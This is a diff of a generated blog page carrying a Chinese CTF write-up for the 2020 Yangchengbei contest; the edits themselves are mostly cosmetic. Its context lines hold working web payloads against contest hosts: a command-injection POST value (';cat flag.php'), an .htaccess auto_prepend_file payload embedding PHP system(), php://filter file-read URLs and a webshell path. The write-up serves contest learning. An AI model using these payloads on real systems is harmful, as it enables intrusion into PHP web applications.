@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"yuhaojiang.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="easycon 连接上蚁剑后，发现bbbbbbbbb.txt文件，base64解码保存为图片即可看到flag。 12345678import base64f &#x3D; open(r&amp;#x27;bbbbbbbbb.txt&amp;#x27;,&amp;#x27;r&amp;#x27;)s &#x3D; f.read()f2 &#x3D; open(r&amp;#x27;1.txt&amp;#x27;,&amp;#x27;wb+&amp;#x27;)flag &#x3D; (base64.b">
+  <meta name="description" content="easycon连接上蚁剑后，发现bbbbbbbbb.txt文件，base64解码保存为图片即可看到flag。 12345678import base64f &#x3D; open(r&amp;#x27;bbbbbbbbb.txt&amp;#x27;,&amp;#x27;r&amp;#x27;)s &#x3D; f.read()f2 &#x3D; open(r&amp;#x27;1.txt&amp;#x27;,&amp;#x27;wb+&amp;#x27;)flag &#x3D; (base64.b6">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2020年「羊城杯」网络安全大赛">
 <meta property="og:url" content="https://yuhaojiang.gitee.io/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/index.html">
 <meta property="og:site_name" content="kawhi的博客">
-<meta property="og:description" content="easycon 连接上蚁剑后，发现bbbbbbbbb.txt文件，base64解码保存为图片即可看到flag。 12345678import base64f &#x3D; open(r&amp;#x27;bbbbbbbbb.txt&amp;#x27;,&amp;#x27;r&amp;#x27;)s &#x3D; f.read()f2 &#x3D; open(r&amp;#x27;1.txt&amp;#x27;,&amp;#x27;wb+&amp;#x27;)flag &#x3D; (base64.b">
+<meta property="og:description" content="easycon连接上蚁剑后，发现bbbbbbbbb.txt文件，base64解码保存为图片即可看到flag。 12345678import base64f &#x3D; open(r&amp;#x27;bbbbbbbbb.txt&amp;#x27;,&amp;#x27;r&amp;#x27;)s &#x3D; f.read()f2 &#x3D; open(r&amp;#x27;1.txt&amp;#x27;,&amp;#x27;wb+&amp;#x27;)flag &#x3D; (base64.b6">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-09-10T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-10-15T11:22:16.613Z">
+<meta property="article:modified_time" content="2020-10-16T03:10:04.439Z">
 <meta property="article:author" content="kawhi">
 <meta name="twitter:card" content="summary">
 
@@ -185,7 +185,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-15 19:22:16" itemprop="dateModified" datetime="2020-10-15T19:22:16+08:00">2020-10-15</time>
+                <time title="修改时间：2020-10-16 11:10:04" itemprop="dateModified" datetime="2020-10-16T11:10:04+08:00">2020-10-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -208,12 +208,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><hr>
-<p>连接上蚁剑后，发现<code>bbbbbbbbb.txt</code>文件，base64解码保存为图片即可看到flag。</p>
+        <h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>连接上蚁剑后，发现<code>bbbbbbbbb.txt</code>文件，base64解码保存为图片即可看到flag。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 
-<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><hr>
-<p>源码在</p>
+<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>源码在</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/Hei_Mao_Jing_Chang.mp3</span><br></pre></td></tr></table></figure>
 
 <p>源码为</p>
@@ -225,8 +223,7 @@
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/</span><br><span class="line"><span class="comment">#post提交</span></span><br><span class="line">Black-Cat-Sheriff=<span class="number">04</span>b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat+flag.php&amp;White-cat-monitor=%<span class="number">5</span>B%<span class="number">5</span>D</span><br></pre></td></tr></table></figure>
 
-<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><hr>
-<p>源码为</p>
+<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>源码为</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>在网上可以找到原题：<code>X-NUCA&#39;2019—Ezphp</code></p>
@@ -248,8 +245,7 @@
 <p>payload</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#x27;cat /f&#x27;.&#x27;lag&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
 
-<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><hr>
-<p>首先访问<code>robots.txt</code>，提示<code>Disallow: /star1.php/</code>，源代码里有:</p>
+<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p>首先访问<code>robots.txt</code>，提示<code>Disallow: /star1.php/</code>，源代码里有:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  小胖说用个不安全的协议从我家才能进ser.php呢！  !--&gt;</span><br></pre></td></tr></table></figure>
 
 <p>不安全协议用<code>http</code>访问：</p>
@@ -267,8 +263,7 @@
 <p>蚁剑连上在根目录<code>/ffflag</code>即可获得flag。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10024</span>/sandbox/hrnh1cvpq4bvbm960878icaodb/shell.php</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>
 
-<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><hr>
-<p>首先用伪协议读取文件</p>
+<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>首先用伪协议读取文件</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</span><br><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure>
 
 <p>源码为：</p>
@@ -307,6 +302,13 @@
 
 
         
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/" rel="prev" title="ciscn初赛">
+      <i class="fa fa-chevron-left"></i> ciscn初赛
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
       </footer>
     
   </article>
@@ -380,14 +382,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
